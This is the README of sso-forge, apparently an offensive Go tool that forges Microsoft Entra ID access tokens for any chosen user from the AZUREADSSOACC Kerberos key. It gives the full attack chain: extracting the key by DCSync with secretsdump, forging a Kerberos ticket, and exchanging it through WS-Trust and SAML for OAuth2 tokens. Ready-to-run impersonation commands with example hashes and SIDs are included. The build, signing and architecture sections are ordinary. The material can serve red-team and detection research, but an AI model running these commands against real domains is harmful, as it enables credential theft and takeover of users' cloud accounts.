# sso-forge

[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/JVBotelho/sso-forge/badge)](https://securityscorecards.dev/viewer/?uri=github.com/JVBotelho/sso-forge)
[![Go](https://img.shields.io/github/go-mod/go-version/JVBotelho/sso-forge)](https://go.dev/)
[![Release](https://img.shields.io/github/v/release/JVBotelho/sso-forge)](https://github.com/JVBotelho/sso-forge/releases)

Forge Entra ID Seamless SSO access tokens from the AZUREADSSOACC Kerberos key.
Cross-platform (Linux/macOS/Windows) Go port of AADInternals.

## How it works

```
DCSync → AZUREADSSOACC key → forged Kerberos ticket → WS-Trust → SAML → OAuth2 → Entra ID access token
```

1. Extract the AZUREADSSOACC computer account's RC4/AES256 key via DCSync (secretsdump.py)
2. Forge a Kerberos service ticket for `HTTP/autologon.microsoftazuread-sso.com`
3. Exchange via WS-Trust for a DesktopSsoToken (SAML assertion)
4. Exchange the SAML assertion for an OAuth2 access token

## Usage

```bash
# Extract key via Impacket
secretsdump.py DOMAIN/Administrator@DC -just-dc-user 'AZUREADSSOACC$'

# Forge token (RC4)
./sso-forge \
  --hash 61bb7f03790448210063f5fe4cf1ca50 \
  --sid S-1-5-21-2653903403-2779602846-1005841238-1110 \
  --domain corp.contoso.com \
  --realm CORP.CONTOSO.COM \
  --upn user@corp.contoso.com \
  --output token

# AES256 key (auto-detected from key length)
./sso-forge \
  --hash <64-char AES256 hex key> \
  --sid S-1-5-21-... \
  --domain corp.contoso.com \
  --realm CORP.CONTOSO.COM \
  --upn user@corp.contoso.com

# secretsdump output format (auto-parsed)
./sso-forge \
  --hash 'DOMAIN\AZUREADSSOACC$:aad_...:<NT_HASH>:<NT_HASH>:::' \
  --sid S-1-5-21-... \
  --domain corp.contoso.com \
  --realm CORP.CONTOSO.COM
```

## Output formats

| Flag | Output |
|------|--------|
| `--output token` | Raw JWT access token (default) |
| `--output json` | JSON with access_token, refresh_token, claims metadata |
| `--output saml` | SAML 1.1 assertion XML |
| `--output ssotoken` | DesktopSsoToken (raw WS-Trust response) |

## Flags

| Flag | Description |
|------|-------------|
| `--hash` | AZUREADSSOACC key (hex 32-char RC4, 64-char AES256, or secretsdump line) |
| `--sid` | Target user SID (e.g., S-1-5-21-X-Y-Z-RID) |
| `--domain` | Public UPN domain suffix (e.g., contoso.com) |
| `--realm` | On-prem AD FQDN in uppercase (e.g., CORP.CONTOSO.COM) |
| `--upn` | Target user UPN |
| `--ticket` | Pre-generated base64 SPNEGO ticket (skips forge) |
| `--resource` | Target resource URL (default: https://graph.windows.net) |
| `--tenant-id` | Entra ID tenant ID (auto-discovered if empty) |
| `--dry-run` | Forge ticket only, skip cloud exchange |
| `-v` | Verbose output |

## Build

```bash
go build -ldflags="-s -w" -o sso-forge .
make build     # stripped binary
make release   # cross-platform + checksums
```

## Security

- [OpenSSF Scorecard](https://securityscorecards.dev/viewer/?uri=github.com/JVBotelho/sso-forge)
- Signed releases with [cosign](https://github.com/sigstore/cosign)
- SBOMs generated for every release
- Dependencies pinned via go.sum
- [Security policy](SECURITY.md)

Verify a release:
```bash
cosign verify-blob sso-forge-linux-amd64 \
  --signature sso-forge-linux-amd64.sig \
  --certificate sso-forge-linux-amd64.pem \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  --certificate-identity "https://github.com/JVBotelho/sso-forge/.github/workflows/release.yml@refs/tags/<TAG>"
```

## Requirements

- AZUREADSSOACC key (RC4 or AES256) — extracted via DCSync (secretsdump.py, Mimikatz, etc.)
- Target user SID and UPN
- Domain must have Seamless SSO enabled (Azure AD Connect synced)

## Architecture

```
sso-forge/
├── main.go                   # CLI entry point
├── pac/                      # PAC construction (KERB_VALIDATION_INFO, checksums)
├── ticket/                   # EncTicketPart + Authenticator DER assembly, encryption
├── exchange/                 # WS-Trust → SAML → OAuth2 pipeline
├── parse/                    # supplementalCredentials blob + hash input parsing
├── discovery/                # Tenant ID auto-discovery via OpenID config
├── docs/                     # Documentation
│   └── dev/                  # Development notes (gitignored)
├── go.mod
├── Makefile
└── README.md
```

All packages are public and importable:
```go
import (
    "github.com/JVBotelho/sso-forge/pac"
    "github.com/JVBotelho/sso-forge/ticket"
    "github.com/JVBotelho/sso-forge/exchange"
    "github.com/JVBotelho/sso-forge/parse"
    "github.com/JVBotelho/sso-forge/discovery"
)
```

## References

- [AADInternals](https://github.com/Gerenios/AADInternals) — PowerShell reference implementation
- [Microsoft Seamless SSO Docs](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works)
- [MS-PAC Protocol Specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac)
- [gokrb5](https://github.com/jcmturner/gokrb5) — Go Kerberos library
